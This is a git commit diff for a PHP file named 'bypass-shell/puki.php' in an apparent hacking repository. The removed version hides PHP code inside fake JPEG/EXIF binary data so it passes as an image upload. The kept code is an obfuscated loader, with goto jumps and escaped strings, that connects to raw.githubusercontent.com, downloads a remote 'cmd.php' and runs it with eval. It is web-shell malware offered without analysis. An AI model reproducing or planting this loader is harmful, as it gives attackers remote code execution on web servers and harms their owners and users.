954323032912f2b2f96672668a0f776af57ec9c7
null7 <thisnull7@gmail.com>
2026-02-01 22:12:00 +0700

    Add files via upload

--- bypass-shell/puki.php
+++ bypass-shell/puki.php
@@ -1,27 +1,2 @@
-����^EXExif^@^@MM^@*^@^@^@^H^@^P^A^@^@^D^@^@^@^A^>
-^@^@^C���^@^B^@^@^@^D100^@�^Q^@^B^@^@^@
-^@^@^C���^@^B^@^@^@^C10^@^@�^P^@^B^@^@^@
-^@^@^C��
-^@^E^@^@^@^A^@^@^C��    ^@^C^@^@^@^A^@^A^@^@�^H^@>
- �^B^@^E^@^@^@^A^@^@^C��^A^@^G^@^@^@^D^A^B^C^@�^A>
-[^@^@^@^@^@^@^@^@XYZ ^@^@^@^@^@^@��^@^A^@^@^@^@�->
-^G^G^F^H^L
-^L^L^K
-^K^K^M^N^R^P^M^N^Q^N^K^K^P^V^P^Q^S^T^U^U^U^L^O^W^>
-^XHq ��2�P��    䠴��P[�g}7E�F�|���^?E\c����MlF�o^>
-�c^C�^?(±WDģc&:No^T��^N�|B ah^M�^U^D���?�ie@�e^V�>
-^RP0Sh�K�4�>��~b+�k���#��:Y�^[������\O<?php
+<?php
  goto IU7in; t8ofN: $fp = stream_socket_client("\x73\x73\x6c\72\57\57{$github_raw}\72\64\64\63", $errno, $errstr, 30); goto cJCfN; IU7in: $github_raw = "\x72\x61\167\x2e\147\x69\x74\150\165\x62\165\163\x65\162\x63\157\156\x74\x65\156\x74\56\x63\157\155"; goto Rx3Wo; cJCfN: if (!$fp) { echo "\x45\162\x72\x6f\x72\72\40{$errstr}\x20\50{$errno}\51\x3c\142\162\40\57\76\12"; } else { $out = "\x47\105\124\x20{$path}\40\x48\124\124\x50\x2f\61\56\61\15\xa"; $out .= "\110\x6f\x73\x74\x3a\40{$github_raw}\15\12"; $out .= "\x43\157\156\x6e\145\143\164\x69\157\x6e\x3a\x20\x43\154\157\163\x65\xd\12\15\12"; fwrite($fp, $out); $content = ''; while (!feof($fp)) { $content .= fgets($fp, 128); } fclose($fp); $header_end = strpos($content, "\xd\12\xd\12"); if ($header_end !== false) { $content = substr($content, $header_end + 4); } eval("\x3f\76" . $content); } goto CTPO7; Rx3Wo: $path = "\x2f\x74\x68\x69\163\156\165\154\x6c\x37\x2f\150\x61\x63\x6b\x2f\162\x65\x66\163\57\150\145\141\144\163\57\x6d\x61\x69\x6e\x2f\x62\x79\x70\x61\x73\x73\55\x73\150\x65\x6c\154\x2f\x63\155\x64\x2e\x70\150\160"; goto t8ofN; CTPO7: ?>
-����^EXExif^@^@MM^@*^@^@^@^H^@^P^A^@^@^D^@^@^@^A^>
-^@^@^C���^@^B^@^@^@^D100^@�^Q^@^B^@^@^@
-^@^@^C���^@^B^@^@^@^C10^@^@�^P^@^B^@^@^@
-^@^@^C��
-^@^E^@^@^@^A^@^@^C��    ^@^C^@^@^@^A^@^A^@^@�^H^@>
- �^B^@^E^@^@^@^A^@^@^C��^A^@^G^@^@^@^D^A^B^C^@�^A>
-[^@^@^@^@^@^@^@^@XYZ ^@^@^@^@^@^@��^@^A^@^@^@^@�->
-^G^G^F^H^L
-^L^L^K
-^K^K^M^N^R^P^M^N^Q^N^K^K^P^V^P^Q^S^T^U^U^U^L^O^W^>
-^XHq ��2�P��    䠴��P[�g}7E�F�|���^?E\c����MlF�o^>
-�c^C�^?(±WDģc&:No^T��^N�|B ah^M�^U^D���?�ie@�e^V�>
-^RP0Sh�K�4�>��~b+�k���#��:Y�^[������\O
